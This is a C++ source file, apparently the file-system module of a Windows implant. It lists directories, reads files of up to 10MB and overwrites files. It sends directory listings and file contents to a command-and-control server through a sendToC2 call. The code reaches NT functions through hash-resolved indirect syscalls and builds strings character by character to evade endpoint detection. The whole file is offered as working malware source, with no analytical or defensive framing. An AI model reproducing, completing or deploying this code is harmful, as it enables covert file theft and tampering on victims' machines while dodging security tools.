#include "Modules/file_io.h"
#include "Core/api_resolve.h"
#include "Core/syscalls.h"
#include "Crypto/obfuscation.h"
#include "Crypto/hashing.h"
#include "Network/c2_server.h"
#include "Utils/helpers.h"
#include <string>
#include <cstring>

//internal dir
void Internal_Dir(const wchar_t* directoryPath) {
    HANDLE hFile;
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uPath;
    SYSCALL_GATE gate;

    mRtlInitUnicodeString(&uPath, directoryPath); 
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    //NtOpenFile
    gate = GetSSNByHash(0xA9E5F0C58370BF96); 
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)FILE_LIST_DIRECTORY | SYNCHRONIZE, (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)FILE_SHARE_READ | FILE_SHARE_WRITE, (ULONG_PTR)FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, 0,0,0,0,0);

    if (status != 0) return;

    //NtQueryDirectoryFile
    BYTE buffer[32768];
    gate = GetSSNByHash(0X30E3894380C79459);
    PREPARE_SYSCALL(gate);

    //FileBothDirectoryInformation
    status = IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)&ioStatus, (ULONG_PTR)buffer, (ULONG_PTR)sizeof(buffer), (ULONG_PTR)3, (ULONG_PTR)FALSE, (ULONG_PTR)NULL, (ULONG_PTR)FALSE);

    if (status == 0) {
        PFILE_BOTH_DIR_INFORMATION pDirInfo = (PFILE_BOTH_DIR_INFORMATION)buffer;
        wchar_t prefix[] = {'C','o','n','t','e','n','t','s',' ','o','f',' ','\0'};
        wchar_t suffix[] = {':','\n','\0'};
        wchar_t fileList[8192] = {0};
        wcscat(fileList, prefix);
        wcscat(fileList, directoryPath);
        wcscat(fileList, suffix);

        while (TRUE) {
            // copy filename
            wchar_t fileName[MAX_PATH] = {0};
            wcsncpy(fileName, pDirInfo->FileName, pDirInfo->FileNameLength / sizeof(WCHAR));
            
            wcscat(fileList, fileName);
            wcscat(fileList, L"\n");

            if (pDirInfo->NextEntryOffset == 0) break;
            pDirInfo = (PFILE_BOTH_DIR_INFORMATION)((BYTE*)pDirInfo + pDirInfo->NextEntryOffset);
        }

        // Convert wchar_t to char for sendToC2
        char narrowBuf[16384] = {0};
        wcstombs(narrowBuf, fileList, sizeof(narrowBuf) - 1);
        sendToC2(narrowBuf);
    }

    //NtClose
    gate = GetSSNByHash(0X5E575BD8ACC77BC0);
    PREPARE_SYSCALL(gate);
    IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0,0,0,0,0);
}

//internal read
void Internal_Read(const wchar_t* filePath) {
    HANDLE hFile;
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uPath;
    SYSCALL_GATE gate;

    const SIZE_T MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB cap

    mRtlInitUnicodeString(&uPath, filePath);
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    gate = GetSSNByHash(0xA9E5F0C58370BF96);
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)FILE_GENERIC_READ | SYNCHRONIZE, (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)FILE_SHARE_READ, (ULONG_PTR)FILE_SYNCHRONOUS_IO_NONALERT, 0, 0, 0, 0, 0);

    if (status != 0) return;

    API_TABLE& API = GetAPI();
    HANDLE hHeap = API.GetProcessHeap();
    SIZE_T contentCap = 8192;
    SIZE_T contentLen = 0;
    char* content = (char*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, contentCap);
    if (!content) { goto read_close; }

    BYTE buffer[4096];
    LARGE_INTEGER offset;
    offset.QuadPart = 0;

    while (true) {
        memset(buffer, 0, sizeof(buffer));
        memset(&ioStatus, 0, sizeof(ioStatus));

        gate = GetSSNByHash(0x697E267980924D76);
        PREPARE_SYSCALL(gate);
        
        status = IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)&ioStatus, (ULONG_PTR)buffer, (ULONG_PTR)sizeof(buffer) - 1, (ULONG_PTR)&offset, (ULONG_PTR)NULL, 0, 0);

        if (status != 0 && status != 0x00000103) break;
        if (ioStatus.Information == 0) break;

        // Grow buffer if needed
        if (contentLen + ioStatus.Information + 1 > contentCap) {
            SIZE_T newCap = contentCap * 2;
            if (newCap > MAX_FILE_SIZE + 4096) newCap = MAX_FILE_SIZE + 4096;
            char* newBuf = (char*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, newCap);
            if (!newBuf) break;
            custom_memcpy(newBuf, content, contentLen);
            API.RtlFreeHeap(hHeap, 0, content);
            content = newBuf;
            contentCap = newCap;
        }

        custom_memcpy(content + contentLen, buffer, ioStatus.Information);
        contentLen += ioStatus.Information;
        offset.QuadPart += ioStatus.Information;

        if (contentLen >= MAX_FILE_SIZE) {
            break;
        }
    }

    if (contentLen > 0) {
        char header[] = {'F','i','l','e',' ','C','o','n','t','e','n','t',':','\n','`','`','`','\n','\0'};
        char footer[] = {'\n','`','`','`','\0'};
        SIZE_T msgLen = strlen(header) + contentLen + strlen(footer) + 1;
        char* msg = (char*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, msgLen);
        if (msg) {
            strcpy(msg, header);
            custom_memcpy(msg + strlen(header), content, contentLen);
            strcpy(msg + strlen(header) + contentLen, footer);
            sendToC2(msg);
            API.RtlFreeHeap(hHeap, 0, msg);
        }
    }
    API.RtlFreeHeap(hHeap, 0, content);

read_close:
    // NtClose
    gate = GetSSNByHash(0X5E575BD8ACC77BC0);
    PREPARE_SYSCALL(gate);
    IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}


//internal write
void Internal_Write(const wchar_t* filePath, const char* data) {
    HANDLE hFile;
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uPath;
    SYSCALL_GATE gate;

    mRtlInitUnicodeString(&uPath, filePath);
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // NtCreateFile
    gate = GetSSNByHash(0XB7211C63C61BC7FF);
    PREPARE_SYSCALL(gate);
    
    status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)FILE_GENERIC_WRITE | SYNCHRONIZE, (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)NULL, (ULONG_PTR)FILE_ATTRIBUTE_NORMAL, (ULONG_PTR)0, (ULONG_PTR)FILE_OVERWRITE_IF, (ULONG_PTR)FILE_SYNCHRONOUS_IO_NONALERT, (ULONG_PTR)NULL, (ULONG_PTR)0);

    if (status != 0) return;

    gate = GetSSNByHash(0X3757ADB1A2DD0B4F);
    PREPARE_SYSCALL(gate);
    
    status = IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)&ioStatus, (ULONG_PTR)data, (ULONG_PTR)strlen(data), (ULONG_PTR)NULL, (ULONG_PTR)NULL, 0, 0);

    if (status == 0) {
        sendToC2(STR("Data written successfully to file."));
    }

    // NtClose
    gate = GetSSNByHash(0X5E575BD8ACC77BC0);
    PREPARE_SYSCALL(gate);
    IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
}
